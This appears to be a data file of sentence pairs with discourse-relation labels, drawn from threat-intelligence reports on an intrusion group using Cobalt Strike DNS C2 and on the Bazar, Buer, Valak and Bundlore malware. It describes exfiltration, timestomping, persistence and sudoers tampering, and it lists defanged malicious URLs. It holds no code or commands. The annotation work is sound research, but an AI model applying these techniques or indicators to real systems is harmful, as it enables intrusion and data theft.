        "S2": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary is applying living off the land techniques very well by incorporating default Windows tools in its arsenal.",
        "S2": "- Windows event logs clearing,",
        "relation": "MISC"
    },
    {
        "S1": "But first: How did they get the tools on the victim\u2019s systems?",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary copied those tools over SMB from compromised system to compromised system wherever they needed these tools.",
        "S2": "In preparation of exfiltration of the data needed for their objective, the adversary collected the data from various sources within the victim\u2019s network.",
        "relation": "NEXT"
    },
    {
        "S1": "A few examples of commands we observed:",
        "S2": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "relation": "MISC"
    },
    {
        "S1": "As described before, the adversary collected data from an information repository, Microsoft SharePoint Online in this case.",
        "S2": "In all cases we\u2019ve seen the adversary copying results of the discovery phase, like file- and directory lists from local systems, network shared drives, and file shares on remote systems.",
        "relation": "ELABORATION"
    },
    {
        "S1": "But email collection is also important for this adversary: with every intrusion we saw the mailbox of some users being copied, from both local and remote systems:",
        "S2": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "relation": "NEXT"
    },
    {
        "S1": "How this data is obtained likely differs per victim, but we observed the usage of several custom DLL files used to continuously retrieve data from memory of systems where such data is typically processed.",
        "S2": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "relation": "NEXT"
    },
    {
        "S1": "After placing the DLL in the appropriate directory, the actor would change the date and time stamps on the DLL files to blend in with the other legitimate files in the directory.",
        "S2": "The actor specifies the following arguments when running the exfiltration tool:",
        "relation": "NEXT"
    },
    {
        "S1": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "S2": "Only a handful of times the adversary copies the data first before compressing (archive collected data) and exfiltrating it.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We\u2019ve seen the adversary staging data on a remote system or on the local system.",
        "S2": "We have observed the following filenames overlapping all intrusions:",
        "relation": "MISC"
    },
    {
        "S1": "The adversary compresses and encrypts the data by using WinRAR from the command-line.",
        "S2": "The adversary typically places the executables in the following folders:",
        "relation": "NEXT"
    },
    {
        "S1": "We have observed the following filenames overlapping all intrusions:",
        "S2": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "relation": "MISC"
    },
    {
        "S1": "The adversary typically places the executables in the following folders:",
        "S2": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "relation": "NEXT"
    },
    {
        "S1": "The following four different variants of the use of rar.exe as update.exe we have observed:",
        "S2": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "relation": "MISC"
    },
    {
        "S1": "This time the adversary compresses the data as a gzipped tar-file: tar.gz.",
        "S2": "The adversary uses Cobalt Strike as framework to manage their compromised systems.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "relation": "MISC"
    },
    {
        "S1": "We observed the use of Cobalt Strike\u2019s C2 protocol encapsulated in DNS by the adversary in 2017 and 2018.",
        "S2": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "relation": "MISC"
    },
    {
        "S1": "An interesting observation is they made use of a cracked/patched trial version of Cobalt Strike.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": "MISC"
    },
    {
        "S1": "This is important to note because the functionalities of Cobalt Strike\u2019s trial version are limited.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": "MISC"
    },
    {
        "S1": "More importantly: the trial version doesn\u2019t support encryption of command and control traffic in cases where the protocol itself isn\u2019t encrypted, such as DNS.",
        "S2": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "relation": "MISC"
    },
    {
        "S1": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "S2": "We developed a Python script that decoded and combined most of the logged C2 communication into a human readable format.",
        "relation": "MISC"
    },
    {
        "S1": "In one intrusion we investigated, the victim had years of logging available of outgoing DNS-requests.",
        "S2": "This means that only the DNS C2 leaving the victim\u2019s network was logged.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "S2": "The activity took place six days a week, rarely on Sundays.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As the adversary used Cobalt Strike with DNS as command control protocol, we were able to reconstruct more than two years of adversary activity.",
        "S2": "The following cloud storage web services are supported by the malware:",
        "relation": "MISC"
    },
    {
        "S1": "With all this activity data, it was possible for us to create some insight into the \u2018office\u2019-hours of this adversary.",
        "S2": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "S2": "The adversary also changed their domains for command control around the same time they switched C2 protocols.",
        "relation": "MISC"
    },
    {
        "S1": "We observed some periods where we expected activity of the adversary, but almost none was observed.",
        "S2": "We have observed the exfiltration tool in the following locations:",
        "relation": "MISC"
    },
    {
        "S1": "They used a subdomain under a regular parent domain with a .com TLD in 2017 and 2018, but they started using sub-domains under the parent domain appspot.com and azureedge.net in 2019.",
        "S2": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "relation": "MISC"
    },
    {
        "S1": "The adversary uses the command and control channel to exfiltrate small amounts of data.",
        "S2": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "relation": "ELABORATION"
    },
    {
        "S1": "For large amounts of data, such as the mailboxes and network shares with intellectual property, they use something else.",
        "S2": "The adversary attempts to clean-up some of the traces from their intrusions.",
        "relation": "NEXT"
    },
    {
        "S1": "The actor specifies the following arguments when running the exfiltration tool:",
        "S2": "We have observed the exfiltration tool in the following locations:",
        "relation": "ELABORATION"
    },
    {
        "S1": "We have observed the exfiltration tool in the following locations:",
        "S2": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "relation": "MISC"
    },
    {
        "S1": "While we don\u2019t know what was deleted and we were unable to recover, we did see some of their anti-forensics activity:",
        "S2": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Windows event logs clearing,",
        "S2": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "relation": "LIST"
    },
    {
        "S1": "For indicator removal on host: Timestomp the adversary uses a Windows version of the Linux touch command.",
        "S2": "This makes sure the used tools by the adversary blend in with the other files in the directory when shown in a timeline.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this email campaign, instead of relying on attachments, the attackers included links to what appeared to be a legitimate Google Docs document, which itself contained links to malicious files hosted on Google Drive or, in some cases, hosted elsewhere.",
        "S2": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In some previous phishing email campaigns, attackers leveraged SendGrid to distribute the initial emails to hide the Google Drive links in the documents behind a SendGrid URL as a way to bypass traditional defences.",
        "S2": "The link in both emails is a Google Docs link claiming to host a PDF file with a list of employees that have been terminated, as shown in Figure 3.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Samples of emails that we have seen are shown in Figure 1 and Figure 2.",
        "S2": "We are not going to go into technical details because detailed analysis of this has already published.",
        "relation": "MISC"
    },
    {
        "S1": "The link in the Google Doc redirects to the URL unitedyfl[.]com/print_preview.exe to download the malware payload.",
        "S2": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "S2": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "relation": "MISC"
    },
    {
        "S1": "Although, the use of target names with actuating themes is not new to this group, there has been a significant uptick in the number of emails received and this campaign has been persistently active for the past few weeks.",
        "S2": "In this campaign, no process self-injection is used to load the payload.",
        "relation": "MISC"
    },
    {
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}",
        "relation": "NEXT"
    },
    {
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In most cases, the payload that is downloaded is the Bazar malware but, in some cases, it is the Buer loader.",
        "S2": "The Bazar backdoor is a new stealthy malware, part of the TrickBot group\u2019s toolkit arsenal and leveraged for high-value targets.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this campaign, no process self-injection is used to load the payload.",
        "S2": "The samples used in this campaign heavily rely on control flow obfuscation.",
        "relation": "MISC"
    },
    {
        "S1": "The Bazar loader is used to download and execute the Bazar backdoor on the target system.",
        "S2": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "relation": "MISC"
    },
    {
        "S1": "The goal of this backdoor is to execute binaries, scripts, modules, kill processes, and then remove itself from the compromised machine.",
        "S2": "The detailed analysis report about this backdoor can be found here.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Bazar loader downloads the Bazar backdoor from the C&C using the following URI format: {C&C}/api/v\\d{3}",
        "S2": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "relation": "MISC"
    },
    {
        "S1": "The downloaded malware was successfully captured by the Zscaler Cloud Sandbox: Figure 6: The Zscaler Cloud Sandbox report.",
        "S2": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "relation": "LIST"
    },
    {
        "S1": "The C&C TLS communications of the Bazar backdoor have been using certificates created in the same manner that TrickBot certificates have been created.",
        "S2": "Researchers also observed that the backdoor downloads and executes the Cobalt Strike pentesting and post-exploitation toolkit on the victim's machine within some period of time after the infection.",
        "relation": "MISC"
    },
    {
        "S1": "It has most of the important strings encrypted and APIs are loaded by hash, just like most of the sophisticated malware these days.",
        "S2": "The Buer loader was captured by the Zscaler Cloud Sandbox.",
        "relation": "MISC"
    },
    {
        "S1": "In these campaigns, the most common infection vector is via Microsoft Word documents embedded with malicious macro code.",
        "S2": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "relation": "NEXT"
    },
    {
        "S1": "Malicious macro code is used to download a DLL file with .cab extension named \u201cU.tmp\u201d and saved into the temp folder.",
        "S2": "After downloading the DLL, the code launches the malicious DLL using \u201cregsvr32.exe\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "S2": "Valak creates connections to the different C2 servers in the list with two predefined URIs:",
        "relation": "MISC"
    },
    {
        "S1": "This stage of the Valak malware uses a malicious JavaScript file with a random name that changes per execution.",
        "S2": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The downloaded JavaScript code, \u201csly4.0\u201d, contains a variable called \u201cPRIMARY_C2\u201d that holds multiple fake and legitimate domains, including Google, Gmail, Avast, and Microsoft.",
        "S2": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "relation": "MISC"
    },
    {
        "S1": "Valak creates connections to the different C2 servers in the list with two predefined URIs:",
        "S2": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "relation": "NEXT"
    },
    {
        "S1": "One URI is used to download an encoded file named \u201cproject.aspx\u201d",
        "S2": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "*in version 30, the file was renamed to \u201crpx.aspx\u201d.",
        "S2": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "relation": "LIST"
    },
    {
        "S1": "*in version 30, the file was renamed to \u201cgo.aspx\u201d.",
        "S2": "In the second stage, it downloads additional modules for reconnaissance activity and to steal sensitive information.",
        "relation": "MISC"
    },
    {
        "S1": "Both files are decoded by the malware using Base64 and an XOR cipher.",
        "S2": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware sets information like the C2 server, ID, the downloaded payload, and the decoded project.aspx in a registry key under \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\u201d.",
        "S2": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "relation": "NEXT"
    },
    {
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "relation": "NEXT"
    },
    {
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After downloading the payloads and setting the registry keys and values, Valak sets it\u2019s persistence via a scheduled task.",
        "S2": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "relation": "MISC"
    },
    {
        "S1": "The script in the ADS (\u201cDefault2.ini\u201d) executes the content of the registry key, \u201cHKCU\\Software\\ApplicationContainer\\Appsw64\\ServerUrl\u201d, which holds the contents of \u201cproject.aspx\u201d, the second stage JavaScript file.",
        "S2": "The script is executed by the scheduled task used to maintain persistence, with its main goal being:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "S2": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The two payloads (\u201cproject.aspx\u201d and \u201ca.aspx\u201d) and the configuration in the registry keys are used in the second stage to perform malicious activities.",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": "MISC"
    },
    {
        "S1": "Download and parse additional payloads from the C2.",
        "S2": "These functions are called from the \u201cParseTask\u201d function, and receive the parsed tasks from the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In the second stage, the configuration file has been altered to contain a unique \u201cClient_ID\u201d and a different file that it will try to download called \u201cbounce.aspx\u201d.",
        "S2": "If the malware downloads a payload that starts with the word \u201cODTASK\u201d, it calls \u201cCreateOleExecJob\u201d, which writes the payload as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPerfWatson_%taskname%\u201d to run it.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the malware receives a content starting with the word \u201cTASK\u201d, it calls \u201cCreateExecJob\u201d, which writes the content as an ADS of the file \u201cC:\\\\Users\\\\Public\\\\PowerManagerSpm.jar\u201d and creates a scheduled task \u201cPowerUtility_%taskname%W\u201d to run it.",
        "S2": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "relation": "MISC"
    },
    {
        "S1": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "S2": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "relation": "MISC"
    },
    {
        "S1": "Our analysis reveals that this time, the payload downloaded by Valak was IcedID.",
        "S2": "During this analysis, we discovered several different modules with the same internal name, \u201cManagedPlugin.dll\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "In previous infections, Valak downloaded different remote administration tools like putty.exe and NetSupport Manager.",
        "S2": "Valak\u2019s Modular Plugin Architecture",
        "relation": "MISC"
    },
    {
        "S1": "Valak\u2019s Modular Plugin Architecture",
        "S2": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "S2": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The functionality of the executable \u201cPluginHost.exe\u201d is divided into four classes: Bot, HTTPClient, Program and Utils, which will allow it to perform its main goal of downloading and loading additional components of the malware.",
        "S2": "Both functions use the Utils class to read registry entries.",
        "relation": "MISC"
    },
    {
        "S1": "GetC2() reads from the registry entry \u201cShimV4\u201d, which holds the C2 domain.",
        "S2": "The GetPluginBytes() function gets the C2 domain using GetC2() and adds an embedded URI.",
        "relation": "LIST"
    },
    {
        "S1": "The HTTPClient class contains two functions, post and GetPluginBytes.",
        "S2": "The Utils class contains several maintenance functions used by the other classes.",
        "relation": "LIST"
    },
    {
        "S1": "The URL is used to download an additional module for the plugin.",
        "S2": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.",
        "relation": "MISC"
    },
    {
        "S1": "This function executes the function GetPluginBytes() to download the module components with type \u201cManagedPlugin\u201d.",
        "S2": "Another interesting argument in the \u201ccredential\u201d function is \u201cCredentialType\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "These components will be loaded reflectively to the executable\u2019s memory and expand the plugin capabilities.",
        "S2": "When referring to additional plugins, it is worth noting that in early versions of Valak the plugins were downloaded by the second stage JS via PowerShell.",
        "relation": "MISC"
    },
    {
        "S1": "More recent versions of Valak abandoned the popular yet easily detectable PowerShell downloader approach and transitioned to PluginHost as a means of managing and downloading additional payloads.",
        "S2": "However, unlike \u201cPluginHost\u201d, it contains several reconnaissance functions that focus on gathering information about the user, the machine, and existing AV products.",
        "relation": "NEXT"
    },
    {
        "S1": "This transition indicates that the Valak authors are looking for stealthier approaches and ways to improve their evasion techniques.",
        "S2": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "relation": "MISC"
    },
    {
        "S1": "These modules are downloaded and loaded by \u201cPluginHost.exe\u201d.",
        "S2": "Among these components, some focus on one single, specific activity to achieve their goal and are relatively less robust than others when it comes to capability and potential impact.",
        "relation": "MISC"
    },
    {
        "S1": "- Systeminfo : responsible for extensive reconnaissance; targets local and domain admins",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Exchgrabber: aims to steal Microsoft Exchange data and infiltrates the enterprises mail system",
        "S2": "Below is a deep dive of \u201csysteminfo\u201d and \u201cexchgrabber\u201d, which are more advanced and complex than the aforementioned plugin components.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Procinfo: collects information about the infected machine\u2019s running processes",
        "S2": "- Screencap: captures screenshots from the infected machine",
        "relation": "LIST"
    },
    {
        "S1": "- Procinfo: collects information about the infected machine\u2019s running processes",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Netrecon: performs network reconnaissance",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Screencap: captures screenshots from the infected machine",
        "S2": "This includes ipgeo, procinfo, netrecon and screencap.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The module gathers information about the user and attempts to verify whether this is a local admin or a domain admin.",
        "S2": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "relation": "NEXT"
    },
    {
        "S1": "This shows that after infecting the machine, Valak chooses to target mainly administrators and domain admins.",
        "S2": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "relation": "MISC"
    },
    {
        "S1": "The module attempts to find whether the infected machine has any security products installed using the AntivirusSoftware() function.",
        "S2": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "relation": "NEXT"
    },
    {
        "S1": "The module also collects the physical address (MAC) and the IP address of the infected machine.",
        "S2": "In order to exfiltrate data, the plugin uses the function \u201cpost\u201d in the HTTPClient class.",
        "relation": "NEXT"
    },
    {
        "S1": "\u201cPost\u201d gives the plugin the ability to upload content and exfiltrate data to the remote C2 whose domain is stored in the registry.",
        "S2": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "relation": "MISC"
    },
    {
        "S1": "Similar to \u201cPluginHost\u201d, \u201cSystemInfo\u201d uses another function called GetQuery() that builds the URL to send the information to the remote C2.",
        "S2": "Exchgrabber, similar to systeminfo, shares some similarities with PluginHost when it comes to several function names like Bot, HTTPClient, and Utils; however, it has its own differentiated capabilities.",
        "relation": "MISC"
    },
    {
        "S1": "The core functionality of the \u201cManagedPlugin\u201d module is in the \u201cManagedPlugin\u201d class.",
        "S2": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The module handles its credential management in the class \u201cCredential\u201d, which includes several functions that handle the credential management activity and data types that will hold these credentials.",
        "S2": "It inserts these credentials into the respective module variable.",
        "relation": "MISC"
    },
    {
        "S1": "One of the most interesting functions in this class is \u201cCredential\u201d which receives four arguments: username, password, target, and CredentialType.",
        "S2": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "relation": "ELABORATION"
    },
    {
        "S1": "It inserts these credentials into the respective module variable.",
        "S2": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "relation": "MISC"
    },
    {
        "S1": "The \u201ctarget\u201d variable is used in the core ManagedPlugin function to store strings related to Microsoft Office applications.",
        "S2": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "relation": "MISC"
    },
    {
        "S1": "The type of credentials is determined by another part of the enum variable called \u201cCredentialType\u201d, which contains each of the credentials that the module will attempt to extract.",
        "S2": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The credential types are sensitive information that can be extracted from the enterprise Microsoft Exchange server data, including Domain Password & Domain Certificate.",
        "S2": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When inspecting the core logic behind the class MainPlugin, it\u2019s clear how each class collaborates with others to extract data from Microsoft Exchange and Outlook.",
        "S2": "The primary purpose of the Exchange Autodiscover service is to establish initial connections to Exchange user mailboxes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The module attempts to check if the extracted data is related to Microsoft Office or MS.Outlook.",
        "S2": "\u201cAutodiscover.xml\u201d is a dynamically generated file that contains the data Microsoft Outlook needs to access the mailbox entered in the configuration wizard.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After collecting the sensitive data, the module compresses it using Base64.",
        "S2": "Then, it sends the sensitive data to the attacker\u2019s C2 with the POST function and an embedded URI.",
        "relation": "NEXT"
    },
    {
        "S1": "The mm-install->macos variant of the Bundlore family of macOS adware has been around for many years in many variations and delivery methods.",
        "S2": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "relation": "MISC"
    },
    {
        "S1": "Recently, a variant with a novel installation method was discovered.",
        "S2": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Although most of the installation details were the same or similar to the samples analyzed in the blogs above, these new samples modified the sudoers file on the infected system to remove the password requirement for privilege escalation.",
        "S2": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "S2": "The command in the second line of the script takes the last 254kb of the resource fork on the Install.command file, unzips the contents, then further decompresses the data, copying it to the previously created temporary directory.",
        "relation": "ELABORATION"
    },
    {
        "S1": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "S2": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This extension was pulled from an adware site http://download[.]mycouponsmartmac[.]com and was not publicly uploaded at the time of analysis.",
        "S2": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "S2": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "S2": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "S2": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "relation": "NEXT"
    },
    {
        "S1": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "S2": "Immediately after the Flash zip file is downloaded, the browser is redirected to a site offering the download of another Chrome extension named \u201cSearch Manager\u201d",
        "relation": "NEXT"
    },
    {
        "S1": "More details regarding this extension are covered in the Configuration Profiles section below.",
        "S2": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "relation": "MISC"
    },
    {
        "S1": "The script extracts compressed data containing a macOS .app in a hidden resource known as a resource fork.",
        "S2": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Resource forks were originally designed to allow an executable to store multiple resources within the file, yet remain separated from the executable data.",
        "S2": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "S2": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "relation": "MISC"
    },
    {
        "S1": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "S2": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "S2": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "relation": "NEXT"
    },
    {
        "S1": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "S2": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "relation": "NEXT"
    },
    {
        "S1": "Immediately after installation of the application extracted by the script, the user\u2019s browser is redirected to another site that claims the Startup Disk is almost full, offering software to \u201cclean\u201d the system:",
        "S2": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.",
        "relation": "NEXT"
    },
    {
        "S1": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "S2": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "relation": "NEXT"
    },
    {
        "S1": "PingTrusteer is one of the applications installed by the analyzed Bundlore variant above.",
        "S2": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "relation": "MISC"
    },
    {
        "S1": "This program checks for updates daily using a script pulled from http://request[.]pingtrusteer[.]com/macCheckForUpdates.",
        "S2": "Similar to previous variants, the script as pulled from http://request[.]pingtrusteer[.]com on 2 Jun 2020 exhibited the following functionality:",
        "relation": "NEXT"
    },
    {
        "S1": "The malware gains the ability to install programs with root privileges (without requiring a password) by adding the following line to /etc/sudoers file:",
        "S2": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.",
        "relation": "MISC"
    },
    {
